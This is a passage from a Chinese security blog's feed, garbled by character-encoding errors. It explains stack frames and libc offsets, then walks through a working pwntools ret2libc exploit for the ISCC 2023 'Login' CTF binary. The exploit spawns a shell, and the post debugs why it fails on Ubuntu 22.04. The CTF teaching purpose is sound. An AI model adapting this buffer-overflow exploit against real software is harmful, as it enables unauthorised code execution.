src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%884.png" alt="å‡½æ•°è°ƒç”¨æ ˆ4.png"></p><ol start="7"><li>æ¥ç€æ‰§è¡Œ <code>ret</code> æŒ‡ä»¤ï¼Œ<code>ret</code> æŒ‡ä»¤ç›¸å½“äºï¼š</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">pop eip   <span class="token comment">; è¿™æ ·å†™æ˜¯æ–¹ä¾¿ç†è§£ï¼Œå®é™…ä¸Šä¸å­˜åœ¨ pop eip è¿™ä¸ªæ±‡ç¼–æŒ‡ä»¤</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…ˆå°†æ­¤æ—¶ ESP æ‰€æŒ‡å‘çš„åœ°å€ <code>0xffffce04</code> ä¸­å­˜æ”¾çš„ <code>call fun</code> æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‡ºæ ˆé€å…¥ EIPï¼Œç„¶åç”±äºå‡ºæ ˆçš„ pop æ“ä½œä½¿å¾— <code>esp = esp + 4</code>ï¼Œå› æ­¤æ‰§è¡Œ <code>pop ebp</code> å ESP æŒ‡å‘ <code>0xffffce08</code> åœ°å€å¤„</p><p>EIP ä¸­å­˜æ”¾çš„æ˜¯ä¸‹ä¸€æ¡è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ï¼Œç”±äºè¿™é‡Œä¿®æ”¹äº† EIP çš„å€¼ä¸º <code>call fun</code> æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€</p><p>å› æ­¤è¿™æ—¶ç¨‹åºä¼šè½¬è€Œæ‰§è¡Œ <code>call fun</code> æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œ<strong>ç¨‹åºä¹Ÿå°±ä» fun å‡½æ•°å›åˆ°äº† main å‡½æ•°ä¸­</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%885.png" alt="å‡½æ•°è°ƒç”¨æ ˆ5.png"></p><p>åˆ°è¿™é‡Œï¼Œæ ˆåˆå›åˆ°äº† main ä¸­ <code>call fun</code> è¿™å¥æ‰§è¡Œä¹‹å‰çš„æ ·å­</p><blockquote><p><em>æ³¨æ„ï¼šæ ˆä¸­çš„æ•°æ®å‡ºæ ˆåä»ç„¶ä¼šä¿å­˜åœ¨å†…å­˜å•å…ƒä¸­ï¼Œåªæ˜¯ ESP çš„å€¼æ”¹å˜äº†ï¼Œè®¡ç®—æœºè®¤ä¸ºå‡ºæ ˆåçš„æ•°æ®å·²ç»ä¸åœ¨æ ˆé‡Œé¢äº†ï¼ˆè®¡ç®—æœºæ ¹æ® EBP å’Œ ESP æ¥è¯†åˆ«æ ˆç©ºé—´ï¼‰ï¼Œä½†è¿™ä¸ªæ•°æ®è¿˜æ˜¯åœ¨å†…å­˜å•å…ƒä¸­ä¿å­˜ç€ï¼Œä¸ä¼šå› ä¸ºå‡ºæ ˆè€Œè¢«æ¸…ç©º</em></p></blockquote><hr><h2 id="å›åˆ°-main-å‡½æ•°"><a href="#å›åˆ°-main-å‡½æ•°" class="headerlink" title="å›åˆ° main å‡½æ•°"></a>å›åˆ° main å‡½æ•°</h2><ol start="8"><li>å½“ main ä¸­å‰©ä½™çš„æ“ä½œæ‰§è¡Œå®Œåï¼Œä¹Ÿä¼šæ‰§è¡Œ <code>leave</code> æŒ‡ä»¤</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%886.png" alt="å‡½æ•°è°ƒç”¨æ ˆ6.png"></p><p>è¿™æ—¶å€™ ESP å›åˆ°æœ€å¼€å§‹çš„ <code>0xffffce2c</code> åœ°å€å¤„ï¼ŒEBP ä¹Ÿå›åˆ°åŸæœ¬ EBP æ‰€åœ¨çš„åœ°å€å¤„</p><p>æœ€åé€šè¿‡ <code>ret</code> æŒ‡ä»¤å›åˆ° main å‡½æ•°è¢«è°ƒç”¨æ—¶çš„ä½ç½®ï¼Œæ•´ä¸ªç¨‹åºçš„ä¸»å‡½æ•°æ‰§è¡Œåˆ°è¿™é‡Œå°±ç»“æŸäº†</p>]]></content>
    
    
    <summary type="html">ç®€å•è®°å½•ä¸€ä¸‹å‡½æ•°åœ¨è°ƒç”¨è¿‡ç¨‹ä¸­æ ˆçš„å˜åŒ–ï¼Œå¯¹äºç†è§£ ROP å’Œç¨‹åºçš„æ‰§è¡Œæµç¨‹å¾ˆæœ‰å¸®åŠ©</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="x86æ±‡ç¼–" scheme="https://www.uf4te.cn/tags/x86%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>PWNä¸­ç¨‹åºçš„libcé—®é¢˜</title>
    <link href="https://www.uf4te.cn/posts/1205d4ce.html"/>
    <id>https://www.uf4te.cn/posts/1205d4ce.html</id>
    <published>2023-11-23T16:00:00.000Z</published>
    <updated>2024-06-05T06:37:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h1><blockquote><p><code>libc.so</code> æ˜¯ä¸€ä¸ªåŠ¨æ€é“¾æ¥æ–‡ä»¶ï¼Œåœ¨ç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œæ‰ä¼šå»å¯»æ‰¾åº“æ–‡ä»¶ï¼Œå–å‡ºé‡Œé¢çš„ä»£ç æ”¾è¿›å†…å­˜è¿è¡Œï¼ˆåƒå¹³æ—¶åœ¨è¿è¡Œ Windows æ—¶å¼¹å‡ºçš„ <code>&quot;æ‰¾ä¸åˆ° xxx.dllæ–‡ä»¶&quot;</code> å…¶å®å°±æ˜¯åŠ¨æ€é“¾æ¥ï¼‰</p><p><strong>ä¸€èˆ¬æ¥è¯´ï¼Œlibc ä¸­å­˜æ”¾çš„éƒ½æ˜¯ä½¿ç”¨è¿‡çš„å‡½æ•°ã€å­—ç¬¦ä¸²ç­‰</strong></p></blockquote><ol><li><strong>åœ¨ <code>libc.so</code> åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚</strong> ä¹Ÿå°±æ˜¯è¯´ï¼Œè™½ç„¶ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒçœŸå®åœ°å€ä¼šéšç€æ¯ä¸€æ¬¡åŠ è½½ libc è€Œå˜åŒ–ï¼Œä½†æ˜¯ä¸¤ä¸ªå‡½æ•°ä¹‹é—´çš„åç§»é‡æ€»æ˜¯å›ºå®šä¸å˜çš„</li></ol><p>å‡è®¾æ–‡ä»¶ä¸­ä¸‰ä¸ªå‡½æ•°çš„åœ°å€æ˜¯ 0x40010ã€0x40020ã€0x40050ï¼Œä½†æ˜¯åŠ è½½åˆ°å†…å­˜åä¼šå¢åŠ ä¸€ä¸ªåŸºåœ°å€ï¼Œå‡è®¾åŸºåœ°å€ä¸º 0x000100ï¼Œè™½ç„¶åœ°å€å˜äº†ï¼Œä½†ä»–ä»¬ä¹‹é—´çš„ç›¸å¯¹åç§»è¿˜æ˜¯ä¸€æ ·çš„</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E5.png" alt="æ ˆæº¢å‡ºæ¼æ´5.png"></p><ol start="2"><li><strong>æ ¹æ®ç³»ç»Ÿçš„ç‰ˆæœ¬ä¸åŒï¼Œç³»ç»Ÿä¸­æ‰€ä½¿ç”¨çš„ libc çš„ç‰ˆæœ¬ä¹Ÿä¼šæœ‰æ‰€å·®åˆ«ã€‚</strong> æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦ç¡®å®šç¨‹åºæ‰€ä½¿ç”¨çš„æ˜¯å“ªä¸€ä¸ªç‰ˆæœ¬çš„ libcï¼Œè¿™é‡Œå¯ä»¥ç”¨ <code>LibcSearcher</code> æ¥å¯»æ‰¾ï¼ˆä¹Ÿæœ‰çš„é¢˜ä¼šç›´æ¥ç»™å‡º libc æ–‡ä»¶ï¼‰</li></ol><p>ä¸è¿‡ <code>LibcSearcher</code> æ‰¾åˆ°çš„ libc ç‰ˆæœ¬å¯èƒ½æœ‰å¤šä¸ªï¼Œæœ‰æ—¶å€™éœ€è¦å»åˆ¤æ–­ï¼Œè€Œä¸”å¾—åˆ°çš„å­—ç¬¦ä¸²çš„åœ°å€ä¸ä¸€å®šåˆšåˆšå¥½ï¼Œå¯èƒ½éœ€è¦é€šè¿‡è°ƒè¯•å»éªŒè¯ã€‚å¦å¤–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç½‘ç«™æ¥æŸ¥è¯¢ï¼š<a href="https://libc.blukat.me/">libc database search</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E7.png" alt="æ ˆæº¢å‡ºæ¼æ´7.png"></p><blockquote><p>æ³¨æ„ï¼š<br>é€šè¿‡ ret2libc è®¡ç®—å‡º libc åŸºåœ°å€æ—¶ï¼Œ<strong>libc åŸºåœ°å€ <code>libcbase</code> æœ€åä¸‰ä½ä¸€èˆ¬æ˜¯å…¨ 0</strong>ï¼Œå¯ç”¨äºåˆ¤æ–­æ˜¯å¦è®¡ç®—æ­£ç¡®ï¼Œlibc åŸºåœ°å€å¯ä»¥åœ¨ GDB ä¸­ä½¿ç”¨ <code>vmmap</code> è¿›è¡ŒæŸ¥çœ‹</p><p>å¦å¤–ï¼Œ<strong>libc ä¸­çš„å‡½æ•°åç§»åœ¨åŠ è½½åˆ°å†…å­˜ååœ°å€æœ€åä¸‰ä½æ˜¯ä¸ä¼šå˜çš„</strong>ï¼Œä¾‹å¦‚ï¼š<code>system()</code> å‡½æ•°åœ¨ libc ä¸­åç§»é‡ä¸º 0x48<em>E50</em>ï¼Œåˆ™åŠ è½½åˆ°å†…å­˜ä¸­å¯èƒ½ä¸º 0xF7D1B<em>E50</em></p><p><mark>ä¸æ“ä½œç³»ç»Ÿçš„ 4 KB åˆ†é¡µæœºåˆ¶æœ‰å…³ï¼Œ4 KB &#x3D; 4 * 1024 (D) &#x3D; 1000 (H)</mark></p></blockquote><hr><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p>ä»¥ ISCC 2023 çš„ä¸€é“ PWN é¢˜ä¸ºä¾‹ï¼š<a href="https://iscc.isclab.org.cn/">ã€ISCC 2023ã€‘Login</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login1.png" alt="ISCC2023-Login1.png"></p><p>ç¨‹åºé€»è¾‘å¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login3.png" alt="ISCC2023-Login3.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login5.png" alt="ISCC2023-Login5.png"></p><p>å‡½æ•° <code>main()</code> æ ˆä¸­çš„æƒ…å†µï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login4.png" alt="ISCC2023-Login4.png"></p><p>æ€è·¯æ¯”è¾ƒç®€å•ï¼Œé¦–å…ˆé€šè¿‡è¾“å…¥ buf æ¥ä¿®æ”¹ v6 çš„å€¼ä¸º 365696460 ï¼ˆ0x15CC15CCï¼‰ ç»•è¿‡ if åˆ¤æ–­</p><p>ç„¶åé€šè¿‡ <code>print_name()</code>Â å‡½æ•°ä¸­çš„Â <code>memcpy()</code>Â å°† v4 å¤åˆ¶åˆ° dest ä¸­ï¼Œç”±äº v4 é•¿åº¦ä¸º 0x100ï¼Œè€Œ dest é•¿åº¦ä¸º 0x20ï¼Œå¯ä»¥åˆ©ç”¨ v4 è¦†ç›– dest æ¥ä¿®æ”¹è¿”å›åœ°å€</p><p>è€Œé¢˜ç›®ä¸­æ²¡æœ‰ <code>system()</code> å‡½æ•°å’Œ <code>&quot;/bin/sh&quot;</code>ï¼Œä½†æ˜¯ç»™å‡ºäº† libc æ–‡ä»¶</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login6.png" alt="ISCC2023-Login6.png"></p><p>åŒæ—¶ç¨‹åºè¾“å‡ºäº† stdin çš„çœŸå®åœ°å€ ï¼ˆé€šè¿‡åŠ¨æ€è°ƒè¯•å‘ç°å…¶å®æ˜¯ <code>_IO_2_1_stdin_</code> è€Œä¸æ˜¯ <code>stdin</code>ï¼‰</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login9.png" alt="ISCC2023-Login9.png"></p><p>å› æ­¤ä½¿ç”¨ ret2libc æ¥è·å– <code>system()</code> å‡½æ•°å’Œ <code>&quot;/bin/sh&quot;</code> çš„åœ°å€</p><p>åœ¨ Ubuntu 16.04 ä¸‹ï¼Œä½¿ç”¨å¦‚ä¸‹ exp ç›´æ¥è·å¾— shellï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment"># è·å–ç¨‹åºè¾“å‡ºçš„åœ°å€</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span> <span class="token comment"># ä¿®æ”¹ v6 ç»•è¿‡ if</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># åˆ©ç”¨ _IO_2_1_stdin_ è®¡ç®— libc åç§»</span>libcbase <span class="token operator">=</span> stdin_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span> <span class="token comment"># 64 ä½ä¼ å‚</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span> <span class="token comment"># ç”¨äºå †æ ˆå¹³è¡¡ï¼ˆglibc 2.27 ä»¥ä¸‹å¯ä»¥ä¸åŠ  ret, ä¸å½±å“ç¨‹åºæ‰§è¡Œæµï¼‰</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ç”±äºåœ¨ Ubuntu 16.04 ä¸­ï¼Œglibc 2.27 ä»¥ä¸‹ç‰ˆæœ¬ä¸å­˜åœ¨ <code>system()</code> å‡½æ•°ä¸­ <code>movaps</code> æŒ‡ä»¤æ“ä½œ XMM å¯„å­˜å™¨çš„å †æ ˆå¹³è¡¡é—®é¢˜ï¼Œå› æ­¤ payload ä¸­ <code>p64(ret)</code> å¯åŠ å¯ä¸åŠ </p><p><mark>ä½†åœ¨ Ubuntu 22.04 ä¸­å°±å¿…é¡»å¾—åŠ ï¼Œç´¢æ€§å…»æˆä¹ æƒ¯ç›´æ¥åŠ ä¸Š</mark></p><p><em>è¯¦è§ã€Š<a href="PWN%E4%B8%AD64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1.md">PWNä¸­64ä½ç¨‹åºçš„å †æ ˆå¹³è¡¡</a>ã€‹ä¸€æ–‡</em></p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login11.png" alt="ISCC2023-Login11.png"></p><p>ä½†åœ¨ Ubuntu 22.04 ä¸­ä½¿ç”¨åŒæ ·çš„ expï¼Œå°±æ— æ³•è·å¾— shellï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%981.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜1.png"></p><blockquote><p>ç„å­¦çš„é—®é¢˜å‡ºç°äº†ï¼š</p><p>åŒæ ·çš„è„šæœ¬ï¼ŒåŒæ ·çš„ç¨‹åºï¼Œåœ¨ Ubuntu 16.04 å¯ä»¥æ‰“é€šï¼Œåœ¨ Ubuntu 22.04 å°±æ‰“ä¸é€š</p></blockquote><hr><h2 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h2><p>åœ¨ Ubuntu 22.04 ä¸­è°ƒè¯•åˆ†æä¸€ä¸‹</p><p>åœ¨ç¬¬äºŒä¸ª payload å‘é€ä¹‹å‰é™„åŠ  gdb è°ƒè¯•ï¼Œå®Œæ•´æµ‹è¯•è„šæœ¬å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment"># è·å–ç¨‹åºè¾“å‡ºçš„åœ°å€</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span> <span class="token comment"># ä¿®æ”¹ v6 ç»•è¿‡ if</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># åˆ©ç”¨ _IO_2_1_stdin_ è®¡ç®— libc åç§»</span>libcbase <span class="token operator">=</span> stdin_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span> <span class="token comment"># 64 ä½ä¼ å‚</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span> <span class="token comment"># ç”¨äºå †æ ˆå¹³è¡¡ï¼ˆglibc 2.27 ä»¥ä¸‹å¯ä»¥ä¸åŠ  ret, ä¸å½±å“ç¨‹åºæ‰§è¡Œæµï¼‰</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œåˆ° <code>call print_name</code> å¤„</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%982.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜2.png"></p><p>å¯ä»¥çœ‹åˆ° <code>print_name()</code> å‡½æ•°çš„è¿”å›åœ°å€æ²¡æœ‰é—®é¢˜ï¼Œä¸º <code>pop rdi</code></p><p>å•æ­¥ si è¿›å…¥ <code>print_name()</code> å‡½æ•°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%983.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜3.png"></p><p><code>print_name()</code> å‡½æ•°ç»“æŸåï¼Œç¡®å®è¿”å›åˆ° <code>0x4008c3 &lt;__libc_csu_init+99&gt;</code> å¤„æ‰§è¡Œäº† <code>pop rdi</code> æŒ‡ä»¤ï¼Œä¹Ÿæ²¡æœ‰é—®é¢˜</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%984.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜4.png"></p><p>æ‰§è¡Œå®Œ <code>pop rdi</code> æŒ‡ä»¤åï¼Œæ­£å¸¸è¿”å›åˆ° <code>0x400599 &lt;_init+25&gt;</code> å¤„æ‰§è¡Œ <code>ret</code> æŒ‡ä»¤ï¼Œä¹Ÿæ²¡æœ‰é—®é¢˜</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%985.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜5.png"></p><p><code>ret</code> è¿”å›åˆ° <code>0x7fb6dc29a560</code> åœ°å€å¤„</p><p>å†æ¬¡å•æ­¥æ‰§è¡Œï¼Œç¨‹åºä¾¿å´©æºƒäº†ï¼šåœ°å€ <code>0x7fb6dc29a560</code> ä¸åˆæ³•</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%986.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜6.png"></p><p>æŒ‰é“ç†è¯´ï¼Œè¿™ä¸ªåœ°å€å­˜æ”¾çš„åº”è¯¥æ˜¯ <code>system()</code> å‡½æ•°çš„åœ°å€</p><p>å›å¤´è§‚å¯Ÿæ‰§è¡Œ <code>pop rdi</code> æŒ‡ä»¤æ—¶çš„æƒ…å†µï¼Œå‡ºæ ˆåˆ° RDI çš„åœ°å€ä¸ºï¼š<code>0x7fb6dc3e2017</code>ï¼Œæ­£å¸¸æ¥è®²è¿™ä¸ªåœ°å€åº”è¯¥ä¸º <code>&quot;/bin/sh&quot;</code> çš„åœ°å€</p><p>å®é™…å‘ç°è¿™ä¸¤ä¸ªåœ°å€ç¡®å®éƒ½ä¸å­˜åœ¨ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%987.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜7.png"></p><hr><p>è€Œåœ¨ Ubuntu 16.04 ä¸­ä½¿ç”¨åŒæ ·çš„è„šæœ¬è¿›è¡Œè°ƒè¯•æ—¶</p><p>å‘ç°æœ€å <code>ret</code> çš„åœ°å€å°±æ˜¯ <code>system()</code> çš„åœ°å€ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%988.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜8.png"></p><p><code>pop rdi</code> å‡ºæ ˆçš„ä¹Ÿæ˜¯ <code>&quot;/bin/sh&quot;</code> çš„åœ°å€ï¼š</p><p><img 